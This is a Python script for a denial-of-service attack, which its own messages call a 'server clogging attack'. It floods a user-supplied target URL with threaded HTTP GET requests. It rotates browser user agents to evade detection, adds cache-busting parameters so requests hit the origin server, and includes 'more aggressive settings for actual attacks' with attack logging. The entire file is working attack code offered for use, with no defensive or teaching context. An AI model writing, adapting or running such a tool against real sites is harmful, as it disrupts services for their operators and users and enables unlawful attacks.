import requests
import time
import threading
import sys
import random

# Rotating user agents to avoid basic detection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]

def slow_get_flood(url, delay_between_requests, total_requests, thread_id):
    """
    Sends HTTP GET requests to the target URL with a delay between each request.
    """
    successful_requests = 0
    failed_requests = 0
    
    for i in range(total_requests):
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1"
            }
            
            # Add random query parameters to avoid caching
            random_param = f"?cache_buster={random.randint(1000, 9999)}&thread={thread_id}&req={i+1}"
            target_url = url + random_param
            
            response = requests.get(target_url, headers=headers, timeout=8)
            status = response.status_code
            successful_requests += 1
            print(f"[Thread {thread_id}] [{i+1}/{total_requests}] GET -> {target_url} | Status: {status}")
            
        except requests.RequestException as e:
            failed_requests += 1
            print(f"[Thread {thread_id}] [{i+1}/{total_requests}] Request failed: {e}")
        except Exception as e:
            failed_requests += 1
            print(f"[Thread {thread_id}] [{i+1}/{total_requests}] Unexpected error: {e}")
        
        time.sleep(delay_between_requests)
    
    return {"successful": successful_requests, "failed": failed_requests}

def run_threads(url, delay, total_requests, thread_count):
    """
    Runs multiple threads to send GET requests concurrently.
    """
    threads = []
    print(f"\n[*] Launching {thread_count} threads | {total_requests} requests each | {delay}s delay")
    print(f"[*] Target URL: {url}")
    start_time = time.time()
    
    # Store results from each thread
    thread_results = []
    
    for thread_id in range(1, thread_count + 1):
        t = threading.Thread(target=slow_get_flood, args=(url, delay, total_requests, thread_id))
        t.start()
        threads.append(t)
    
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Shutting down gracefully...")
    
    elapsed = round(time.time() - start_time, 2)
    print(f"\n[✓] All threads completed in {elapsed} seconds.")
    
    return elapsed

def is_valid_url(url):
    return url.startswith("http://") or url.startswith("https://")

def run_slow_get_flood(url, delay_sec, requests_per_thread, num_threads):
    """Main function to run the server clogging attack."""
    if not is_valid_url(url):
        print(f"[!] Invalid URL format: {url}")
        return {"error": "Invalid URL format"}
    
    print(f"[+] Starting server clogging attack on: {url}")
    print(f"[+] Configuration: {num_threads} threads, {requests_per_thread} requests per thread, {delay_sec}s delay")
    
    try:
        elapsed_time = run_threads(url, delay_sec, requests_per_thread, num_threads)
        
        total_requests = num_threads * requests_per_thread
        requests_per_second = total_requests / elapsed_time if elapsed_time > 0 else 0
        
        result = {
            "target_url": url,
            "threads": num_threads,
            "requests_per_thread": requests_per_thread,
            "total_requests": total_requests,
            "delay_seconds": delay_sec,
            "elapsed_time": elapsed_time,
            "requests_per_second": requests_per_second,
            "status": "completed"
        }
        
        print(f"\n[+] Attack Summary:")
        print(f"    Total requests sent: {total_requests}")
        print(f"    Total time: {elapsed_time} seconds")
        print(f"    Average rate: {requests_per_second:.2f} requests/second")
        
        return result
        
    except Exception as e:
        error_msg = f"Server clogging attack failed: {e}"
        print(f"[!] {error_msg}")
        return {"error": error_msg}

def run(url, log_file):
    """Run a server clog attack and log the results."""
    print(f"[+] Starting server clog attack on: {url}")
    
    # More aggressive settings for actual attacks
    delay_sec = 0.2        # Reduced from 0.5 for faster attacks
    requests_per_thread = 15  # Increased from 5
    num_threads = 5         # Increased from 3
    
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"[ServerClog] Starting attack on: {url}\n")
        f.write(f"[ServerClog] Configuration: {num_threads} threads, {requests_per_thread} req/thread, {delay_sec}s delay\n")
    
    try:
        result = run_slow_get_flood(url, delay_sec, requests_per_thread, num_threads)
        
        # Log results
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[ServerClog] Attack completed\n")
            f.write(f"[ServerClog] Results: {result}\n\n")
        
        return result
        
    except Exception as e:
        error_msg = f"Server clog attack failed: {e}"
        print(f"[!] {error_msg}")
        
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[ServerClog] Error: {error_msg}\n\n")
        
        return {"error": error_msg}

if __name__ == "__main__":
    url = input("Enter target URL: ").strip()
    run(url, "serverclog_attack.log")